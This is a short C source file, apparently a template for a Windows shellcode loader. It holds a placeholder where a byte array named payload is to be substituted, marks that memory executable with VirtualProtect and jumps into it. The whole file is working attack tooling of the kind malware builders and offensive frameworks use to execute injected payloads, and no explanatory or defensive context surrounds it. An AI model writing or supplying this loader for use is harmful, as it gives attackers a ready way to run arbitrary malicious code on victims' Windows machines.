#include <windows.h>

SHELLCODE_BYTE_ARRAY

size_t payload_size = sizeof(payload);

int main() {
    // Mark memory as executable in-place (Windows allows writable+executable in .data)
    DWORD oldProtect;
    if (!VirtualProtect(payload, payload_size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return 1;
    }

    // Run shellcode
    ((void(*)())payload)();

    // Optionally restore memory protection
    VirtualProtect(payload, payload_size, oldProtect, &oldProtect);

    return 0;
}